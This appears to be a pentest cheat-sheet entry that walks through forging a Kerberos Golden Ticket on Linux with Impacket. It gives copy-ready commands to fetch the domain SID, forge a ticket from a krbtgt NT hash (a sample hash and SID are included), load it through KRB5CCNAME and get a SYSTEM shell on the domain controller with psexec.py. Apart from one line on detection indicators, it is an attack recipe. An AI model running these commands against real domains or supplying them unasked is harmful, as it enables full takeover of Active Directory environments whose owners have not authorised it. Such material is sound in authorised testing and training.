# 09.05 Golden Ticket Linux

> Forge Golden TGT ccache with `ticketer.py` using the krbtgt hash + domain SID and export `KRB5CCNAME` for Impacket reuse.

## Overview

On Linux, impacket's lookupsid.py retrieves the domain SID; ticketer.py forges the Golden Ticket ccache using the krbtgt NT hash and domain SID. The ticket is activated by exporting to KRB5CCNAME and any impacket tool with -k -no-pass uses it immediately. Detection: tickets with blank DOMAIN field or FQDN instead of short name, or 10-year lifetimes, are indicators.

## Steps

- Retrieve domain SID with lookupsid.py domain/user@dc -domain-sids.
- Forge the Golden Ticket with ticketer.py -nthash krbtgt_hash -domain-sid SID -domain domain username.
- Export the resulting .ccache to KRB5CCNAME.
- Use psexec.py -k -no-pass dc01.<DOMAIN>.local for a SYSTEM shell.

## Commands

### lookupsid retrieve domain SID

```bash
lookupsid.py <DOMAIN>.local/[email protected] -domain-sids
```

### ticketer forge Golden Ticket

```bash
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain <DOMAIN>.local Administrator
```

### export and use Golden Ticket

```bash
export KRB5CCNAME=./Administrator.ccache
```
